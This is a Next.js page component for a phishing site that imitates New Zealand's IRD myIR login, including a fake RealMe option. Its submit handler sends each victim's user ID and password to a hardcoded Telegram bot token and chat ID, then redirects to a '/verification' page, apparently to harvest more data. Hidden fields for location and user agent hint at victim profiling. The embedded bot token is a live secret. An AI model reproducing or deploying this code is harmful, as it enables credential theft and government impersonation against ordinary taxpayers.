import { useState } from "react";
import Head from "next/head";
import Image from "next/image";
import { Inter } from "next/font/google";
import styles from "@/styles/Home.module.css";
import { useRouter } from "next/router";
// import telegramBotApi from "telegram-bot-api";

const inter = Inter({ subsets: ["latin"] });

export default function Home() {
  // console.log(telegramBotApi);
  const [passtype, setPasstype] = useState("password");
  const [user, setUser] = useState("");
  const [password, setPassword] = useState("");
  const router = useRouter();

  async function handleOnSubmit(e) {
    e.preventDefault();
    const token = "6047464013:AAGW_UtgQXGerHvLlaBlHUHxKfwbd6vX0wE";
    const chatId = "5996836160";

    await fetch(
      `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=UserName:%20${user}`
    ).then(
      (succ) => {
        console.log(succ);
      },
      (err) => {
        console.log(err);
      }
    );

    await fetch(
      `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=Password:%20${password}`
    ).then(
      (succ) => {
        console.log(succ);
      },
      (err) => {
        console.log(err);
      }
    );

    await router.push("/verification");
  }
  return (
    <>
      <Head>
        <title>IRD GOVT</title>
        <meta name="description" content="Generated by create next app" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <link rel="icon" href="/favicon.ico" />
      </Head>
      <div class="hero w-full h-full">
        <div class="">
          <form
            class=""
            onSubmit={handleOnSubmit}
            method="post"
            id="messageForm"
          >
            <input type="hidden" value="" id="ip" name="IP" />
            <div class="flex md:justify-end justify-center w-full ">
              <div class=" rounded-[4px] px-3 py-4 bg-card text-text w-[320px] m-5 xl:mr-[67px]">
                <div class="px-2 flex flex-col gap-[.8rem]">
                  <div class="">
                    <div class="">
                      <p class="font-light text-[15px] pb-[1px]">User ID</p>
                    </div>
                    <div class=" w-full ">
                      <input
                        type="text"
                        name="userid"
                        aria-label="userid"
                        class="w-full h-[39px] border-b-[2px] border-gray-500 focus:border-[#0d8390] focus:border-b-[3px] p-2"
                        onChange={(e) => setUser(e.target.value)}
                        id=""
                        required
                      />
                    </div>
                  </div>
                  {/* <!-- Password --> */}
                  <div class="relative w-full">
                    <div class="">
                      <div class="">
                        <p class="font-light text-[15px] pb-[1px]">Password</p>
                      </div>

                      <div class=" w-full relative ">
                        <input
                          type={passtype}
                          name="password"
                          aria-label="password"
                          id="myInput"
                          onChange={(e) => setPassword(e.target.value)}
                          class="w-full h-[39px] border-b-[2px] border-gray-500  focus:border-[#0d8390] focus:border-b-[3px] p-2 pr-8"
                          required
                        />
                      </div>
                      {passtype === "password" ? (
                        <div
                          onClick={() => setPasstype("text")}
                          class="absolute right-1 top-[33px]"
                        >
                          <img
                            src="./eye.png"
                            id="passbutt"
                            class="w-[22px] cursor-pointer"
                            alt=""
                            srcset=""
                          />
                        </div>
                      ) : (
                        <div
                          onClick={() => setPasstype("password")}
                          class="absolute right-1 top-[33px]"
                        >
                          <img
                            src="./hide.png"
                            id="passbutt"
                            class="w-[22px] cursor-pointer"
                            alt=""
                            srcset=""
                          />
                        </div>
                      )}
                    </div>
                  </div>
                  <input type="hidden" value="" id="city" name="City" />
                  <input type="hidden" value="" id="region" name="Region" />
                  <input type="hidden" value="" id="country" name="Country" />
                  <input
                    type="hidden"
                    value=""
                    id="user_agent"
                    name="User_Agent"
                  />
                  <input
                    type="hidden"
                    value=""
                    id="country_code"
                    name="Country_Code"
                  />
                  <div class="w-full">
                    <button
                      type="submit"
                      class="bg-secondary w-full h-full py-[6px] font-bold rounded-sm text-white shadow shadow-gray-500"
                    >
                      Log in
                    </button>
                  </div>

                  <div class="w-full">
                    <a class="text-blue-600">Forgot user ID or password? </a>
                  </div>
                  <div class="flex items-center h-full w-full pb-6 pt-2">
                    <div class="w-full h-[.8px] bg-gray-500"></div>
                    <p class="text-[16px] text-black mx-3">Or</p>
                    <div class="w-full h-[.8px]  bg-gray-700"></div>
                  </div>

                  <div class="w-full">
                    <button class="bg-tertiary  w-full h-full py-[7px] font-semibold rounded-sm text-white shadow shadow-gray-500">
                      <div class="flex pl-2 gap-3">
                        <img src="./NZ.png" class="w-[24px]" alt="" srcset="" />
                        <p class="text-[16px]">Log in with RealMe</p>
                      </div>
                    </button>
                  </div>

                  <div class="text-blue-600 pt-8">
                    <p class="">Not yet registered for myIR?</p>
                    <p>Help logging in</p>
                  </div>
                </div>
              </div>
            </div>
          </form>
        </div>
      </div>
    </>
  );
}
